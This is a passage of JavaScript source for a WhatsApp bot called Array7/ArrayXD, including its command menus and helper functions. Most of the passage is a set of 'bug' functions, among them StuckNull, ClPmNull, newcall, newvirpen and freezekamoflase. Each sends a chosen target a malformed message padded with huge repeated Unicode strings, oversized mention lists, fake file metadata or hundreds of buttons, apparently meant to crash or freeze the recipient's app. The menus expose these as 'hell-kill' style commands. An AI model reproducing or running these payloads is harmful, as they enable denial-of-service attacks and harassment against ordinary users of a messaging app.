QESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "6281991410940@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "Hello ",
								"body": " 🌷 𝗔𝗿𝗿𝗮𝘆7 Is Here ϟ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": " p ",
								"mediaUrl": " p ",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": " p "
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: zLoc,
					}
				} : {}
			);
		};
		
// Blank Speciality //
async function BlankInvite(LockJids, ptcp = false) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "𝗔𝗿𝗿𝗮𝘆7" + "\u0000".repeat(50000),
							"jpegThumbnail": "",
							"caption": 'ꦾ'.repeat(30000),
							"inviteExpiration": Date.now() + 1600
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await arrayxd.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}
		
		    async function StuckNull(X, ThM, Ptcp = true) {
      await arrayxd.relayMessage(
        X,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⭑̤▾ ⿻ ȺɍɍȺɏ7 ⿻ ▾⭑̤",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: zkosong,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "...💣 ȺɍɍȺɏ7 ☠️̤\n" +
                    "\n\n\n\n\n\n\n\n\n\n\n\n@6283846077142".repeat(27000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: ["6283846077142@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "𝗔𝗿𝗿𝗮𝘆7 𝗙𝗶𝗹𝗲 ☠️",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
    }

    async function ClPmNull(X, Qtd, ThM, cct = false, ptcp = true) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "ȺɍɍȺɏ7",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: zkosong,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "🐉 ȺɍɍȺɏ7🔥" + "ꦾ" + "ꦾ".repeat(77777),
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: Qtd,
        }
      );

      await arrayxd.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
    }
    
		const aseven = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./all/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"DIKΛƬΉΣGΣПKZ\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const arrayhere = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./all/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"DIKΛƬΉΣGΣПKZ\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

async function newcall(target) {
    let virtex = "𝗔𝗿𝗿𝗮𝘆𝗫𝗗";
    await arrayxd.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: 'call_permission_request',
                                buttonParamsJson: '{}'
                            },
                            {
                                name: 'cta_url',
                                buttonParamsJson: "{ display_text : 'Attack By ArrayXD', url : '', merchant_url : '' }"
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newcall2(target) {
    let virtex = "𝗔𝗿𝗿𝗮𝘆𝗫𝗗" + "𑜦".repeat(40000);

    await arrayxd.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: ""
                    },
                    nativeFlowMessage: {
                        buttons: Array(20).fill({
                            name: 'call_permission_request',
                            buttonParamsJson: '{}'
                        })
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newcall3(target) {
    let virtex = "𝗔𝗿𝗿𝗮𝘆𝗫𝗗";
    let buttons = Array.from({ length: 200 }, () => ({
        name: 'call_permission_request',
        buttonParamsJson: '{}'
    }));
    let overJids = Array.from({ length: 1039900 }, () => target);
    
    await arrayxd.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {
                        buttons: buttons
                    }
                }
            }
        },
        contextInfo: {
            mentionedJid: overJids,
            externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: false,
                title: `𝗔𝗿𝗿𝗮𝘆7`,
                body: `𝗔𝗿𝗿𝗮𝘆7`,
                previewType: "VIDEO",
                thumbnail: "",
                sourceUrl: "https://www.whatsapp.com/",
                mediaUrl: "https://www.whatsapp.com/"
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newcall4(target) {
    let virtex = "𝗔𝗿𝗿𝗮𝘆𝗫𝗗";
    await arrayxd.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: 'call_permission_request',
                                buttonParamsJson: '{}'
                            },
                            {
                                name: 'payment_method',
                                buttonParamsJson: "{}"
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: `{"title":"𝗔𝗿𝗿𝗮𝘆7  ◄${"᬴".repeat(60000)}","sections":[{"title":"# 𝗔𝗿𝗿𝗮𝘆7","rows":[]}]}`
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: `{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"𝗔𝗿𝗿𝗮𝘆7\",\"flow_message_version\":\"9\",\"flow_token\":\"𝗔𝗿𝗿𝗮𝘆7\"}`
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "{}"
                            }
                        ],
                        messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\"𝗔𝗿𝗿𝗮𝘆7\",\"body\":\"Zcoder Crash\"}"
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newvirpen(target) {
    let virtex = "𝗔𝗿𝗿𝗮𝘆7" + "ꦾ".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    let message = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "Attack By ArrayXD"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: virtex 
                        }]
                    }
                }
            }
        }
    };

    await arrayxd.relayMessage(target, message, { participant: { jid: target } }, { messageId: null });
}

async function freezekamoflase(target) {

    await arrayxd.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Attack By ArrayXD" + "ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Attack By ArrayXD" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newfreezebug(target) {
    let virtex = "𝗔𝗿𝗿𝗮𝘆7";

    await arrayxd.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝗔𝗿𝗿𝗮𝘆7" + "@zcoder9".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝗔𝗿𝗿𝗮𝘆7 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

// End Function Bug

// Helper functions
async function replyme(txt) {
const wwk = {
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: 'ArrayXD Official',
newsletterJid: '120363335802741292@newsletter',
},
externalAdreply: {
showAdAttribution: true,
title: 'ArrayXD Bot',
body: 'ArrayXD',
thumbnailUrl: 'https://files.catbox.moe/s6lfx5.mp4',
sourceUrl: 'https://t.me/arrayxd',
},
},
text: txt,
}
arrayxd.sendMessage(from, wwk, {
quoted: m,
})
}

const reaction = async (jidss, emoji) => {
arrayxd.sendMessage(jidss, { react: { text: emoji, key: m.key }})}

arrayxd.sendContact = async (jid, kon, quoted = '', opts = {}) => {
let list = []
for (let i of kon) {
list.push({
displayName: await arrayxd.getName(i),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await arrayxd.getName(i + '@s.whatsapp.net')}\n
FN:${await arrayxd.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:arrayxd170@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://github.com/ArrayXD\n
item3.X-ABLabel:GitHub\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
arrayxd.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
}

const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}

// Plugins Command
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "plugin"))
const arraydeveloper = { arrayxd, replyme, command, example, mime }
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "myfunction") return
await plugin(m, arraydeveloper)
}
}
if (!pluginsDisable) return

// Command handler
switch (command) {

case 'menu': {
let ArrayXD = `Hi *${pushname}*👋
I am a WhatsApp bot named *Array7*, I am here to help you if necessary, type *.showall* or click the button below if you want to display all the menu lists in the *Array7* bot
`
arrayxd.sendMessage(from, { video: { url: `https://files.catbox.moe/s6lfx5.mp4` },
caption: ArrayXD,
gifPlayback: true,
buttons: [
  {
    buttonId: ".showall", 
    buttonText: {
      displayText: 'Show All'
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "Creator"
    }
  }, {
    buttonId: ".script", 
    buttonText: {
      displayText: "Script️"
    }
  }
],
viewOnce: true,
headerType: 6,
businessMessageForwardInfo: {
    businessOwnerJid: arrayxd.decodeJid(arrayxd.user.id) },
}, { quoted: m });
}
break

case 'showall': {
let ArrayXD = `乂 𝗖𝗿𝗲𝗮𝘁𝗼𝗿 : ArrayXD
乂 𝗦𝘁𝗮𝘁𝘂𝘀 : ${isAcces ? "Vip" : "Free"}
乂 𝗩𝗲𝗿𝘀𝗶 : 1.0
乂 𝗧𝘆𝗽𝗲 : Case

友  〈 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱𝗲𝗿 〉
➤ igdl ↯ link
➤ tt ↯ link
➤ ytmp3 ↯ link
➤ ytmp4 ↯ link

友  〈 𝗦𝗲𝗮𝗿𝗰𝗵 〉
➤ play ↯ query
➤ pinterest ↯ query

友  〈 𝗦𝘁𝗶𝗰𝗸𝗲𝗿 〉
➤ brat ↯ text
➤ qc ↯ text
➤ sticker ↯ reply
➤ wm ↯ reply

友  〈 𝗧𝗼𝗼𝗹𝘀 〉
➤ ai ↯ question
➤ encrypt ↯ reply
➤ encrypthard ↯ reply
➤ eval ↯ reply
➤ get ↯ link
➤ hd ↯ reply
➤ clearbug ↯ number
➤ rvo ↯ reply
➤ trackip ↯ ip
`
arrayxd.sendMessage(from, { video: { url: `https://files.catbox.moe/s6lfx5.mp4` },
caption: ArrayXD,
gifPlayback: true,
buttons: [
  {
    buttonId: ".showbug", 
    buttonText: {
      displayText: 'Show Bug'
    }
  }, {
    buttonId: ".setting", 
    buttonText: {
      displayText: "Setting"
    }
  }
],
viewOnce: true,
headerType: 6,
businessMessageForwardInfo: {
    businessOwnerJid: arrayxd.decodeJid(arrayxd.user.id) },
}, { quoted: m });
}
break

case 'showbug': {
let ArrayXD = `乂 𝗖𝗿𝗲𝗮𝘁𝗼𝗿 : ArrayXD
乂 𝗦𝘁𝗮𝘁𝘂𝘀 : ${isAcces ? "Vip" : "Free"}
乂 𝗩𝗲𝗿𝘀𝗶 : 1.0
乂 𝗧𝘆𝗽𝗲 : Case

友  〈 𝗕𝘂𝗴 - 𝗡𝘂𝗺𝗯𝗲𝗿 〉
➤ hell-kill ↯ number
➤ hell-dream ↯ number
➤ hell-execute ↯ number
➤ hell-hatred ↯ number

友  〈 𝗕𝘂𝗴 - 𝗜𝗻𝗽𝗹𝗮𝗰𝗲 〉
➤ hell-this
➤ hell-place

友  〈 𝗕𝘂𝗴 - 𝗚𝗿𝗼𝘂𝗽 〉
➤ hell-gate ↯ id
`
arrayxd.sendMessage(from, { video: { url: `https://files.catbox.moe/s6lfx5.mp4` },
caption: ArrayXD,
gifPlayback: true,
}, { quoted: m });
}
break

case 'setting': {
let ArrayXD = `乂 𝗖𝗿𝗲𝗮𝘁𝗼𝗿 : ArrayXD
乂 𝗦𝘁𝗮𝘁𝘂𝘀 : ${isAcces ? "Vip" : "Free"}
乂 𝗩𝗲𝗿𝘀𝗶 : 1.0
乂 𝗧𝘆𝗽𝗲 : Case

友  〈 𝗦𝗲𝘁𝘁𝗶𝗻𝗴 〉
➤ addaccess ↯ number
➤ dellaccess ↯ number
➤ public
➤ self
`
arrayxd.sendMessage(from, { video: { url: `https://files.catbox.moe/s6lfx5.mp4` },
caption: ArrayXD,
gifPlayback: true,
}, { quoted: m });
}
break

case 'ai': {
